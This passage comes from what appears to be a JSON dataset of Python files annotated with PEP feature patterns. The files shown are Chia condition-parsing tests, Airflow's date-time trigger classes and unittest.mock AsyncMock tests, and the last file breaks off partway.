parse_condition_args(SExp.to([valid_hash]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_hash]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([short_hash]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_hash]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_my_amount(self, safe_mode: bool):\n        valid_amount = int_to_bytes(100)\n        leading_zeros_amount = bytes([0] * 100) + int_to_bytes(100)\n        negative_amount = int_to_bytes(-100)\n        large_negative_amount = bytes([0xFF] * 100) + int_to_bytes(-1)\n        large_amount = int_to_bytes(2 ** 64)\n        cost, args = parse_condition_args(SExp.to([valid_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        assert cost == 0\n        assert args == [valid_amount]\n        if safe_mode:\n            with pytest.raises(ValidationError):\n                parse_condition_args(SExp.to([leading_zeros_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        else:\n            cost, args = parse_condition_args(\n                SExp.to([leading_zeros_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode\n            )\n            assert cost == 0\n            assert args == [valid_amount]\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([negative_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([large_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([large_negative_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode\n            )\n        cost, args = parse_condition_args(\n            SExp.to([valid_amount, b\"garbage\"]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode\n        )\n        assert cost == 0\n        assert args == [valid_amount]\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n    def test_parse_unknown_condition(self):\n        for opcode in [129, 0, 1, 1000, 74]:\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([b\"test\"]), opcode, False)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([b\"foo\", b\"bar\"]), opcode, False)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([]), opcode, False)",
            "patterns": {
                "pep_468": [
                    [
                        167,
                        "generate_test_spend_bundle(*args, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        118,
                        "tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle)"
                    ],
                    [
                        146,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        155,
                        "tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle2)"
                    ],
                    [
                        253,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        276,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(bundle)"
                    ],
                    [
                        500,
                        "tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        881,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        913,
                        "tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle_combined)"
                    ],
                    [
                        937,
                        "unsigned: List[CoinSolution] = spend_bundle_0.coin_solutions"
                    ],
                    [
                        939,
                        "coin_solution: CoinSolution = unsigned[0]"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import Dict, List, Optional, Tuple, Callable",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import Dict, List, Optional, Tuple, Callable",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import Dict, List, Optional, Tuple, Callable",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        38,
                        "    condition_dic: Dict[ConditionOpcode, List[ConditionWithArgs]] = None,",
                        "violation"
                    ],
                    [
                        937,
                        "        unsigned: List[CoinSolution] = spend_bundle_0.coin_solutions",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        53,
                        62,
                        "async generator",
                        "async def two_nodes():\n    async_gen = setup_simulators_and_wallets(2, 1, {})\n    nodes, _ = await async_gen.__anext__()\n    full_node_1 = nodes[0]\n    full_node_2 = nodes[1]\n    server_1 = full_node_1.full_node.server\n    server_2 = full_node_2.full_node.server\n    yield full_node_1, full_node_2, server_1, server_2\n    async for _ in async_gen:\n        yield _"
                    ],
                    [
                        61,
                        62,
                        "async for",
                        "async for _ in async_gen:\n        yield _"
                    ]
                ],
                "pep_498": [
                    [
                        120,
                        "        log.info(f\"Res {res}\")"
                    ]
                ]
            }
        },
        "74": {
            "file": "import asyncio\nimport datetime\nfrom typing import Any, Dict, Tuple\nfrom airflow.triggers.base import BaseTrigger, TriggerEvent\nfrom airflow.utils import timezone\nclass DateTimeTrigger(BaseTrigger):\n    def __init__(self, moment: datetime.datetime):\n        super().__init__()\n        if not isinstance(moment, datetime.datetime):\n            raise TypeError(f\"Expected datetime.datetime type for moment. Got {type(moment)}\")\n        elif moment.tzinfo is None:\n            raise ValueError(\"You cannot pass naive datetimes\")\n        elif not hasattr(moment.tzinfo, \"offset\") or moment.tzinfo.offset != 0:\n            raise ValueError(f\"The passed datetime must be using Pendulum's UTC, not {moment.tzinfo!r}\")\n        else:\n            self.moment = moment\n    def serialize(self) -> Tuple[str, Dict[str, Any]]:\n        return (\"airflow.triggers.temporal.DateTimeTrigger\", {\"moment\": self.moment})\n    async def run(self):\n        while (self.moment - timezone.utcnow()).total_seconds() > 2 * 3600:\n            await asyncio.sleep(3600)\n        while self.moment > timezone.utcnow():\n            await asyncio.sleep(1)\n        yield TriggerEvent(self.moment)\nclass TimeDeltaTrigger(DateTimeTrigger):\n    def __init__(self, delta: datetime.timedelta):\n        super().__init__(moment=timezone.utcnow() + delta)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import Any, Dict, Tuple",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import Any, Dict, Tuple",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        17,
                        "    def serialize(self) -> Tuple[str, Dict[str, Any]]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        19,
                        24,
                        "async generator",
                        "async def run(self):\n        while (self.moment - timezone.utcnow()).total_seconds() > 2 * 3600:\n            await asyncio.sleep(3600)\n        while self.moment > timezone.utcnow():\n            await asyncio.sleep(1)\n        yield TriggerEvent(self.moment)"
                    ]
                ],
                "pep_498": [
                    [
                        10,
                        "            raise TypeError(f\"Expected datetime.datetime type for moment. Got {type(moment)}\")"
                    ],
                    [
                        14,
                        "            raise ValueError(f\"The passed datetime must be using Pendulum's UTC, not {moment.tzinfo!r}\")"
                    ]
                ]
            }
        },
        "75": {
            "file": "import asyncio\nimport inspect\nimport re\nimport unittest\nfrom unittest.mock import (ANY, call, AsyncMock, patch, MagicMock, Mock,\n                           create_autospec, sentinel, _CallList)\ndef tearDownModule():\n    asyncio.set_event_loop_policy(None)\nclass AsyncClass:\n    def __init__(self):\n        pass\n    async def async_method(self):\n        pass\n    def normal_method(self):\n        pass\n    @classmethod\n    async def async_class_method(cls):\n        pass\n    @staticmethod\n    async def async_static_method():\n        pass\nclass AwaitableClass:\n    def __await__(self):\n        yield\nasync def async_func():\n    pass\nasync def async_func_args(a, b, *, c):\n    pass\ndef normal_func():\n    pass\nclass NormalClass(object):\n    def a(self):\n        pass\nasync_foo_name = f'{__name__}.AsyncClass'\nnormal_foo_name = f'{__name__}.NormalClass'\nclass AsyncPatchDecoratorTest(unittest.TestCase):\n    def test_is_coroutine_function_patch(self):\n        @patch.object(AsyncClass, 'async_method')\n        def test_async(mock_method):\n            self.assertTrue(asyncio.iscoroutinefunction(mock_method))\n        test_async()\n    def test_is_async_patch(self):\n        @patch.object(AsyncClass, 'async_method')\n        def test_async(mock_method):\n            m = mock_method()\n            self.assertTrue(inspect.isawaitable(m))\n            asyncio.run(m)\n        @patch(f'{async_foo_name}.async_method')\n        def test_no_parent_attribute(mock_method):\n            m = mock_method()\n            self.assertTrue(inspect.isawaitable(m))\n            asyncio.run(m)\n        test_async()\n        test_no_parent_attribute()\n    def test_is_AsyncMock_patch(self):\n        @patch.object(AsyncClass, 'async_method')\n        def test_async(mock_method):\n            self.assertIsInstance(mock_method, AsyncMock)\n        test_async()\n    def test_is_AsyncMock_patch_staticmethod(self):\n        @patch.object(AsyncClass, 'async_static_method')\n        def test_async(mock_method):\n            self.assertIsInstance(mock_method, AsyncMock)\n        test_async()\n    def test_is_AsyncMock_patch_classmethod(self):\n        @patch.object(AsyncClass, 'async_class_method')\n        def test_async(mock_method):\n            self.assertIsInstance(mock_method, AsyncMock)\n        test_async()\n    def test_async_def_patch(self):\n        @patch(f\"{__name__}.async_func\", return_value=1)\n        @patch(f\"{__name__}.async_func_args\", return_value=2)\n        async def test_async(func_args_mock, func_mock):\n            self.assertEqual(func_args_mock._mock_name, \"async_func_args\")\n            self.assertEqual(func_mock._mock_name, \"async_func\")\n            self.assertIsInstance(async_func, AsyncMock)\n            self.assertIsInstance(async_func_args, AsyncMock)\n            self.assertEqual(await async_func(), 1)\n            self.assertEqual(await async_func_args(1, 2, c=3), 2)\n        asyncio.run(test_async())\n        self.assertTrue(inspect.iscoroutinefunction(async_func))\nclass AsyncPatchCMTest(unittest.TestCase):\n    def test_is_async_function_cm(self):\n        def test_async():\n            with patch.object(AsyncClass, 'async_method') as mock_method:\n                self.assertTrue(asyncio.iscoroutinefunction(mock_method))\n        test_async()\n    def test_is_async_cm(self):\n        def test_async():\n            with patch.object(AsyncClass, 'async_method') as mock_method:\n                m = mock_method()\n                self.assertTrue(inspect.isawaitable(m))\n                asyncio.run(m)\n        test_async()\n    def test_is_AsyncMock_cm(self):\n        def test_async():\n            with patch.object(AsyncClass, 'async_method') as mock_method:\n                self.assertIsInstance(mock_method, AsyncMock)\n        test_async()\n    def test_async_def_cm(self):\n        async def test_async():\n            with patch(f\"{__name__}.async_func\", AsyncMock()):\n                self.assertIsInstance(async_func, AsyncMock)\n            self.assertTrue(inspect.iscoroutinefunction(async_func))\n        asyncio.run(test_async())\nclass AsyncMockTest(unittest.TestCase):\n    def test_iscoroutinefunction_default(self):\n        mock = AsyncMock()\n        self.assertTrue(asyncio.iscoroutinefunction(mock))\n    def test_iscoroutinefunction_function(self):\n        async def foo(): pass\n        mock = AsyncMock(foo)\n        self.assertTrue(asyncio.iscoroutinefunction(mock))\n        self.assertTrue(inspect.iscoroutinefunction(mock))\n    def test_isawaitable(self):\n        mock = AsyncMock()\n        m = mock()\n        self.assertTrue(inspect.isawaitable(m))\n        asyncio.run(m)\n        self.assertIn('assert_awaited', dir(mock))\n    def test_iscoroutinefunction_normal_function(self):\n        def foo(): pass\n        mock = AsyncMock(foo)\n        self.assertTrue(asyncio.iscoroutinefunction(mock))\n        self.assertTrue(inspect.iscoroutinefunction(mock))\n    def test_future_isfuture(self):\n        loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(loop)\n        fut = asyncio.Future()\n        loop.stop()\n        loop.close()\n        mock = AsyncMock(fut)\n        self.assertIsInstance(mock, asyncio.Future)\nclass AsyncAutospecTest(unittest.TestCase):\n    def test_is_AsyncMock_patch(self):\n        @patch(async_foo_name, autospec=True)\n        def test_async(mock_method):\n            self.assertIsInstance(mock_method.async_method, AsyncMock)\n            self.assertIsInstance(mock_method, MagicMock)\n        @patch(async_foo_name, autospec=True)\n        def test_normal_method(mock_method):\n            self.assertIsInstance(mock_method.normal_method, MagicMock)\n        test_async()\n        test_normal_method()\n    def test_create_autospec_instance(self):\n        with self.assertRaises(RuntimeError):\n            create_autospec(async_func, instance=True)\n    def test_create_autospec_awaitable_class(self):\n        awaitable_mock = create_autospec(spec=AwaitableClass())\n        self.assertIsInstance(create_autospec(awaitable_mock), AsyncMock)\n    def test_create_autospec(self):\n        spec = create_autospec(async_func_args)\n        awaitable = spec(1, 2, c=3)\n        async def main():\n            await awaitable\n        self.assertEqual(spec.await_count, 0)\n        self.assertIsNone(spec.await_args)\n        self.assertEqual(spec.await_args_list, [])\n        spec.assert_not_awaited()\n        asyncio.run(main())\n        self.assertTrue(asyncio.iscoroutinefunction(spec))\n        self.assertTrue(asyncio.iscoroutine(awaitable))\n        self.assertEqual(spec.await_count, 1)\n        self.assertEqual(spec.await_args, call(1, 2, c=3))\n        self.assertEqual(spec.await_args_list, [call(1, 2, c=3)])\n        spec.assert_awaited_once()\n        spec.assert_awaited_once_with(1, 2, c=3)\n        spec.assert_awaited_with(1, 2, c=3)\n        spec.assert_awaited()\n    def test_patch_with_autospec(self):\n        async def test_async():\n            with patch(f\"{__name__}.async_func_args\", autospec=True) as mock_method:\n                awaitable = mock_method(1, 2, c=3)\n                self.assertIsInstance(mock_method.mock, AsyncMock)\n                self.assertTrue(asyncio.iscoroutinefunction(mock_method))\n                self.assertTrue(asyncio.iscoroutine(awaitable))\n                self.assertTrue(inspect.isawaitable(awaitable))\n                self.assertEqual(mock_method.await_count, 0)\n                self.assertEqual(mock_method.await_args_list, [])\n                self.assertIsNone(mock_method.await_args)\n                mock_method.assert_not_awaited()\n                await awaitable\n            self.assertEqual(mock_method.await_count, 1)\n            self.assertEqual(mock_method.await_args, call(1, 2, c=3))\n            self.assertEqual(mock_method.await_args_list, [call(1, 2, c=3)])\n            mock_method.assert_awaited_once()\n            mock_method.assert_awaited_once_with(1, 2, c=3)\n            mock_method.assert_awaited_with(1, 2, c=3)\n            mock_method.assert_awaited()\n            mock_method.reset_mock()\n            self.assertEqual(mock_method.await_count, 0)\n            self.assertIsNone(mock_method.await_args)\n            self.assertEqual(mock_method.await_args_list, [])\n        asyncio.run(test_async())\nclass AsyncSpecTest(unittest.TestCase):\n    def test_spec_normal_methods_on_class(self):\n        def inner_test(mock_type):\n            mock = mock_type(AsyncClass)\n            self.assertIsInstance(mock.async_method, AsyncMock)\n            self.assertIsInstance(mock.normal_method, MagicMock)\n        for mock_type in [AsyncMock, MagicMock]:\n            with self.subTest(f\"test method types with {mock_type}\"):\n                inner_test(mock_type)\n    def test_spec_normal_methods_on_class_with_mock(self):\n        mock = Mock(AsyncClass)\n        self.assertIsInstance(mock.async_method, AsyncMock)\n        self.assertIsInstance(mock.normal_method, Mock)\n    def test_spec_mock_type_kw(self):\n        def inner_test(mock_type):\n            async_mock = mock_type(spec=async_func)\n            self.assertIsInstance(async_mock, mock_type)\n            with self.assertWarns(RuntimeWarning):\n                self.assertTrue(inspect.isawaitable(async_mock()))\n            sync_mock = mock_type(spec=normal_func)\n            self.assertIsInstance(sync_mock, mock_type)\n        for mock_type in [AsyncMock, MagicMock, Mock]:\n            with self.subTest(f\"test spec kwarg with {mock_type}\"):\n                inner_test(mock_type)\n    def test_spec_mock_type_positional(self):\n        def inner_test(mock_type):\n            async_mock = mock_type(async_func)\n            self.assertIsInstance(async_mock, mock_type)\n            with self.assertWarns(RuntimeWarning):\n                self.assertTrue(inspect.isawaitable(async_mock()))\n            sync_mock = mock_type(normal_func)\n            self.assertIsInstance(sync_mock, mock_type)\n        for mock_type in [AsyncMock, MagicMock, Mock]:\n            with self.subTest(f\"test spec positional with {mock_type}\"):\n                inner_test(mock_type)\n    def test_spec_as_normal_kw_AsyncMock(self):\n        mock = AsyncMock(spec=normal_func)\n        self.assertIsInstance(mock, AsyncMock)\n        m = mock()\n        self.assertTrue(inspect.isawaitable(m))\n        asyncio.run(m)\n    def test_spec_as_normal_positional_AsyncMock(self):\n        mock = AsyncMock(normal_func)\n        self.assertIsInstance(mock, AsyncMock)\n        m = mock()\n        self.assertTrue(inspect.isawaitable(m))\n        asyncio.run(m)\n    def test_spec_async_mock(self):\n        @patch.object(AsyncClass, 'async_method', spec=True)\n        def test_async(mock_method):\n            self.assertIsInstance(mock_method, AsyncMock)\n        test_async()\n    def test_spec_parent_not_async_attribute_is(self):\n        @patch(async_foo_name, spec=True)\n        def test_async(mock_method):\n            self.assertIsInstance(mock_method, MagicMock)\n            self.assertIsInstance(mock_method.async_method, AsyncMock)\n        test_async()\n    def test_target_async_spec_not(self):\n        @patch.object(AsyncClass, 'async_method', spec=NormalClass.a)\n        def test_async_attribute(mock_method):\n            self.assertIsInstance(mock_method, MagicMock)\n            self.assertFalse(inspect.iscoroutine(mock_method))\n            self.assertFalse(inspect.isawaitable(mock_method))\n        test_async_attribute()\n    def test_target_not_async_spec_is(self):\n        @patch.object(NormalClass, 'a', spec=async_func)\n        def test_attribute_not_async_spec_is(mock_async_func):\n            self.assertIsInstance(mock_async_func, AsyncMock)\n        test_attribute_not_async_spec_is()\n    def test_spec_async_attributes(self):\n        @patch(normal_foo_name, spec=AsyncClass)\n        def test_async_attributes_coroutines(MockNormalClass):\n            self.assertIsInstance(MockNormalClass.async_method, AsyncMock)\n            self.assertIsInstance(MockNormalClass, MagicMock)\n        test_async_attributes_coroutines()\nclass AsyncSpecSetTest(unittest.TestCase):\n    def test_is_AsyncMock_patch(self):\n        @patch.object(AsyncClass, 'async_method', spec_set=True)\n        def test_async(async_method):\n            self.assertIsInstance(async_method, AsyncMock)\n    def test_is_async_AsyncMock(self):\n        mock = AsyncMock(spec_set=AsyncClass.async_method)\n        self.assertTrue(asyncio.iscoroutinefunction(mock))\n        self.assertIsInstance(mock, AsyncMock)\n    def test_is_child_AsyncMock(self):\n        mock = MagicMock(spec_set=AsyncClass)\n        self.assertTrue(asyncio.iscoroutinefunction(mock.async_method))\n        self.assertFalse(asyncio.iscoroutinefunction(mock.normal_method))\n        self.assertIsInstance(mock.async_method, AsyncMock)\n        self.assertIsInstance(mock.normal_method, MagicMock)\n        self.assertIsInstance(mock, MagicMock)\n    def test_magicmock_lambda_spec(self):\n        mock_obj = MagicMock()\n        mock_obj.mock_func = MagicMock(spec=lambda x: x)\n        with patch.object(mock_obj, \"mock_func\") as cm:\n            self.assertIsInstance(cm, MagicMock)\nclass AsyncArguments(unittest.IsolatedAsyncioTestCase):\n    async def test_add_return_value(self):\n        async def addition(self, var):\n            return var + 1\n        mock = AsyncMock(addition, return_value=10)\n        output = await mock(5)\n        self.assertEqual(output, 10)\n    async def test_add_side_effect_exception(self):\n        async def addition(var):\n            return var + 1\n        mock = AsyncMock(addition, side_effect=Exception('err'))\n        with self.assertRaises(Exception):\n            await mock(5)\n    async def test_add_side_effect_coroutine(self):\n        async def addition(var):\n            return var + 1\n        mock = AsyncMock(side_effect=addition)\n        result = await mock(5)\n        self.assertEqual(result, 6)\n    async def test_add_side_effect_normal_function(self):\n        def addition(var):\n            return var + 1\n        mock = AsyncMock(side_effect=addition)\n        result = await mock(5)\n        self.assertEqual(result, 6)\n    async def test_add_side_effect_iterable(self):\n        vals = [1, 2, 3]\n        mock = AsyncMock(side_effect=vals)\n        for item in vals:\n            self.assertEqual(await mock(), item)\n        with self.assertRaises(StopAsyncIteration) as e:\n            await mock()\n    async def test_add_side_effect_exception_iterable(self):\n        class SampleException(Exception):\n            pass\n        vals = [1, SampleException(\"foo\")]\n        mock = AsyncMock(side_effect=vals)\n        self.assertEqual(await mock(), 1)\n        with self.assertRaises(SampleException) as e:\n            await mock()\n    async def test_return_value_AsyncMock(self):\n        value = AsyncMock(return_value=10)\n        mock = AsyncMock(return_value=value)\n        result = await mock()\n        self.assertIs(result, value)\n    async def test_return_value_awaitable(self):\n        fut = asyncio.Future()\n        fut.set_result(None)\n        mock = AsyncMock(return_value=fut)\n        result = await mock()\n        self.assertIsInstance(result, asyncio.Future)\n    async def test_side_effect_awaitable_values(self):\n        fut = asyncio.Future()\n        fut.set_result(None)\n        mock = AsyncMock(side_effect=[fut])\n        result = await mock()\n        self.assertIsInstance(result, asyncio.Future)\n        with self.assertRaises(StopAsyncIteration):\n            await mock()\n    async def test_side_effect_is_AsyncMock(self):\n        effect = AsyncMock(return_value=10)\n        mock = AsyncMock(side_effect=effect)\n        result = await mock()\n        self.assertEqual(result, 10)\n    async def test_wraps_coroutine(self):\n        value = asyncio.Future()\n        ran = False\n        async def inner():\n            nonlocal ran\n            ran = True\n            return value\n        mock = AsyncMock(wraps=inner)\n        result = await mock()\n        self.assertEqual(result, value)\n        mock.assert_awaited()\n        self.assertTrue(ran)\n    async def test_wraps_normal_function(self):\n        value = 1\n        ran = False\n        def inner():\n            nonlocal ran\n            ran = True\n            return value\n        mock = AsyncMock(wraps=inner)\n        result = await mock()\n        self.assertEqual(result, value)\n        mock.assert_awaited()\n        self.assertTrue(ran)\n    async def test_await_args_list_order(self):\n        async_mock = AsyncMock()\n        mock2 = async_mock(2)\n        mock1 = async_mock(1)\n        await mock1\n        await mock2\n        async_mock.assert_has_awaits([call(1), call(2)])\n        self.assertEqual(async_mock.await_args_list, [call(1), call(2)])\n        self.assertEqual(async_mock.call_args_list, [call(2), call(1)])\nclass AsyncMagicMethods(unittest.TestCase):\n    def test_async_magic_methods_return_async_mocks(self):\n        m_mock = MagicMock()\n        self.assertIsInstance(m_mock.__aenter__, AsyncMock)\n        self.assertIsInstance(m_mock.__aexit__, AsyncMock)\n        self.assertIsInstance(m_mock.__anext__, AsyncMock)\n        self.assertIsInstance(m_mock.__aiter__, MagicMock)\n    def test_sync_magic_methods_return_magic_mocks(self):\n        a_mock = AsyncMock()\n        self.assertIsInstance(a_mock.__enter__, MagicMock)\n        self.assertIsInstance(a_mock.__exit__, MagicMock)\n        self.assertIsInstance(a_mock.__next__, MagicMock)\n        self.assertIsInstance(a_mock.__len__, MagicMock)\n    def test_magicmock_has_async_magic_methods(self):\n        m_mock = MagicMock()\n        self.assertTrue(hasattr(m_mock, \"__aenter__\"))\n        self.assertTrue(hasattr(m_mock, \"__aexit__\"))\n        self.assertTrue(hasattr(m_mock, \"__anext__\"))\n    def test_asyncmock_has_sync_magic_methods(self):\n        a_mock = AsyncMock()\n        self.assertTrue(hasattr(a_mock, \"__enter__\"))\n        self.assertTrue(hasattr(a_mock, \"__exit__\"))\n        self.assertTrue(hasattr(a_mock, \"__next__\"))\n        self.assertTrue(hasattr(a_mock, \"__len__\"))\n    def test_magic_methods_are_async_functions(self):\n        m_mock = MagicMock()\n        self.assertIsInstance(m_mock.__aenter__, AsyncMock)\n        self.assertIsInstance(m_mock.__aexit__, AsyncMock)\n        self.assertTrue(asyncio.iscoroutinefunction(m_mock.__aenter__))\n        self.assertTrue(asyncio.iscoroutinefunction(m_mock.__aexit__))\nclass AsyncContextManagerTest(unittest.TestCase):\n    class WithAsyncContextManager:\n        async def __aenter__(self, *args, **kwargs):\n            self.entered = True\n            return self\n        async def __aexit__(self, *args, **kwargs):\n            self.exited = True\n    class WithSyncContextManager:\n        def __enter__(self, *args, **kwargs):\n            return self\n        def __exit__(self, *args, **kwargs):\n            pass\n    class ProductionCode:\n        def __init__(self):\n            self.session = None\n        async def main(self):\n            async with self.session.post('https://python.org') as response:\n                val = await response.json()\n                return val\n    def test_set_return_value_of_aenter(self):\n        def inner_test(mock_type):\n            pc = self.ProductionCode()\n            pc.session = MagicMock(name='sessionmock')\n            cm = mock_type(name='magic_cm')\n            response = AsyncMock(name='response')\n            response.json = AsyncMock(return_value={'json': 123})\n            cm.__aenter__.return_value = response\n            pc.session.post.return_value = cm\n            result = asyncio.run(pc.main())\n            self.assertEqual(result, {'json': 123})\n        for mock_type in [AsyncMock, MagicMock]:\n            with self.subTest(f\"test set return value of aenter with {mock_type}\"):\n                inner_test(mock_type)\n    def test_mock_supports_async_context_manager(self):\n        def inner_test(mock_type):\n            called = False\n            cm = self.WithAsyncContextManager()\n            cm_mock = mock_type(cm)\n            async def use_context_manager():\n                nonlocal called\n                async with cm_mock as result:\n                    called = True\n                return result\n            cm_result = asyncio.run(use_context_manager())\n            self.assertTrue(called)\n            self.assertTrue(cm_mock.__aenter__.called)\n            self.assertTrue(cm_mock.__aexit__.called)\n            cm_mock.__aenter__.assert_awaited()\n            cm_mock.__aexit__.assert_awaited()\n            self.assertIsNot(cm_mock, cm_result)\n        for mock_type in [AsyncMock, MagicMock]:\n            with self.subTest(f\"test context manager magics with {mock_type}\"):\n                inner_test(mock_type)\n    def test_mock_customize_async_context_manager(self):\n        instance = self.WithAsyncContextManager()\n        mock_instance = MagicMock(instance)\n        expected_result = object()\n        mock_instance.__aenter__.return_value = expected_result\n        async def use_context_manager():\n            async with mock_instance as result:\n                return result\n        self.assertIs(asyncio.run(use_context_manager()), expected_result)\n    def test_mock_customize_async_context_manager_with_coroutine(self):\n        enter_called = False\n        exit_called = False\n        async def enter_coroutine(*args):\n            nonlocal enter_called\n            enter_called = True\n        async def exit_coroutine(*args):\n            nonlocal exit_called\n            exit_called = True\n        instance = self.WithAsyncContextManager()\n        mock_instance = MagicMock(instance)\n        mock_instance.__aenter__ = enter_coroutine\n        mock_instance.__aexit__ = exit_coroutine\n        async def use_context_manager():\n            async with mock_instance:\n                pass\n        asyncio.run(use_context_manager())\n        self.assertTrue(enter_called)\n        self.assertTrue(exit_called)\n    def test_context_manager_raise_exception_by_default(self):\n        async def raise_in(context_manager):\n            async with context_manager:\n                raise TypeError()\n        instance = self.WithAsyncContextManager()\n        mock_instance = MagicMock(instance)\n        with self.assertRaises(TypeError):\n            asyncio.run(raise_in(mock_instance))\nclass AsyncIteratorTest(unittest.TestCase):\n    class WithAsyncIterator(object):\n        def __init__(self):\n            self.items = [\"foo\", \"NormalFoo\", \"baz\"]\n        def __aiter__(self):\n            return self\n        async def __anext__(self):\n            try:\n                return self.items.pop()\n            except IndexError:\n                pass\n            raise StopAsyncIteration\n    def test_aiter_set_return_value(self):\n        mock_iter = AsyncMock(name=\"tester\")\n        mock_iter.__aiter__.return_value = [1, 2, 3]\n        async def main():\n            return [i async for i in mock_iter]\n        result = asyncio.run(main())\n        self.assertEqual(result, [1, 2, 3])\n    def test_mock_aiter_and_anext_asyncmock(self):\n        def inner_test(mock_type):\n            instance = self.WithAsyncIterator()\n            mock_instance = mock_type(instance)\n            self.assertFalse(asyncio.iscoroutinefunction(instance.__aiter__))\n            self.assertFalse(asyncio.iscoroutinefunction(mock_instance.__aiter__))\n            self.assertTrue(asyncio.iscoroutinefunction(instance.__anext__))\n            self.assertTrue(asyncio.iscoroutinefunction(mock_instance.__anext__))\n        for mock_type in [AsyncMock, MagicMock]:\n            with self.subTest(f\"test aiter and anext corourtine with {mock_type}\"):\n                inner_test(mock_type)\n    def test_mock_async_for(self):\n        async def iterate(iterator):\n            accumulator = []\n            async for item in iterator:\n                accumulator.append(item)\n            return accumulator\n        expected = [\"FOO\", \"BAR\", \"BAZ\"]\n        def test_default(mock_type):\n            mock_instance = mock_type(self.WithAsyncIterator())\n            self.assertEqual(asyncio.run(iterate(mock_instance)), [])\n        def test_set_return_value(mock_type):\n            mock_instance = mock_type(self.WithAsyncIterator())\n            mock_instance.__aiter__.return_value = expected[:]\n            self.assertEqual(asyncio.run(iterate(mock_instance)), expected)\n        def test_set_return_value_iter(mock_type):\n            mock_instance = mock_type(self.WithAsyncIterator())\n            mock_instance.__aiter__.return_value = iter(expected[:])\n            self.assertEqual(asyncio.run(iterate(mock_instance)), expected)\n        for mock_type in [AsyncMock, MagicMock]:\n            with self.subTest(f\"default value with {mock_type}\"):\n                test_default(mock_type)\n            with self.subTest(f\"set return_value with {mock_type}\"):\n                test_set_return_value(mock_type)\n            with self.subTest(f\"set return_value iterator with {mock_type}\"):\n                test_set_return_value_iter(mock_type)\nclass AsyncMockAssert(unittest.TestCase):\n    def setUp(self):\n        self.mock = AsyncMock()\n    async def _runnable_test(self, *args, **kwargs):\n        await self.mock(*args, **kwargs)\n    async def _await_coroutine(self, coroutine):\n        return await coroutine\n    def test_assert_called_but_not_awaited(self):\n        mock = AsyncMock(AsyncClass)\n        with self.assertWarns(RuntimeWarning):\n            mock.async_method()\n        self.assertTrue(asyncio.iscoroutinefunction(mock.async_method))\n        mock.async_method.assert_called()\n        mock.async_method.assert_called_once()\n        mock.async_method.assert_called_once_with()\n        with self.assertRaises(AssertionError):\n            mock.assert_awaited()\n        with self.assertRaises(AssertionError):\n            mock.async_method.assert_awaited()\n    def test_assert_called_then_awaited(self):\n        mock = AsyncMock(AsyncClass)\n        mock_coroutine = mock.async_method()\n        mock.async_method.assert_called()\n        mock.async_method.assert_called_once()\n        mock.async_method.assert_called_once_with()\n        with self.assertRaises(AssertionError):\n            mock.async_method.assert_awaited()\n        asyncio.run(self._await_coroutine(mock_coroutine))\n        mock.async_method.assert_called_once()\n        mock.async_method.assert_awaited()\n        mock.async_method.assert_awaited_once()\n        mock.async_method.assert_awaited_once_with()\n    def test_assert_called_and_awaited_at_same_time(self):\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited()\n        with self.assertRaises(AssertionError):\n            self.mock.assert_called()\n        asyncio.run(self._runnable_test())\n        self.mock.assert_called_once()\n        self.mock.assert_awaited_once()\n    def test_assert_called_twice_and_awaited_once(self):\n        mock = AsyncMock(AsyncClass)\n        coroutine = mock.async_method()\n        with self.assertWarns(RuntimeWarning):\n            mock.async_method()\n        with self.assertRaises(AssertionError):\n            mock.async_method.assert_awaited()\n        mock.async_method.assert_called()\n        asyncio.run(self._await_coroutine(coroutine))\n       